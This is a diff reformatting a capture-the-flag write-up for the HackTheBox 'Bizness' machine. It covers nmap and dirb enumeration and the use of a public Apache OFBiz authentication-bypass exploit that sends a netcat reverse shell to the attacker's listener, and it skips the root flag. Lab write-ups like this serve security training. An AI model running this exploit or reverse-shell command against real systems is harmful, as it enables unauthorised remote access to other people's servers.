@@ -1,6 +1,11 @@
-# HackTheBox Bizness Writeup
+---
+description: HackTheBox Bizness Writeup (Easy)
+---
+
+# Bizness Writeup
 
 ## Nmap
+
 ```bash
 Nmap scan report for 10.10.11.252
 Host is up, received user-set (0.021s latency).
@@ -64,6 +69,7 @@ PORT      STATE SERVICE    REASON         VERSION
 ```
 
 Visiting http://10.10.11.252 redirects us to https://bizness.htb/. So add bizness.htb to host file and refresh the page.
+
 ```bash
 vi /etc/hosts
 
@@ -71,6 +77,7 @@ vi /etc/hosts
 ```
 
 ### Directory Buster
+
 ```bash
 dirb https://bizness.htb/       
 
@@ -106,7 +113,9 @@ GENERATED WORDS: 4612
 ```
 
 ### Apache Ofbiz
+
 Visiting to https://bizness.htb/accounting/ shows a login page for Apache Ofbiz. Simple googling shows Apache OFBiz Authentication Bypass Vulnerability
+
 ```bash
 # POC: https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass
 git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git
@@ -120,6 +129,7 @@ python3 exploit.py --url https://bizness.htb --cmd 'nc 10.10.14.46 1234 -e /bin/
 ```
 
 ## User Flag
+
 ```bash
 rlwrap nc -lnvp 1234
 listening on [any] 1234 ...
@@ -142,4 +152,5 @@ drwxr-xr-x 3 ofbiz ofbiz-operator 4096 Feb  8 02:21 .local
 ```
 
 ## Root Flag
+
 Root flag sucks, not including
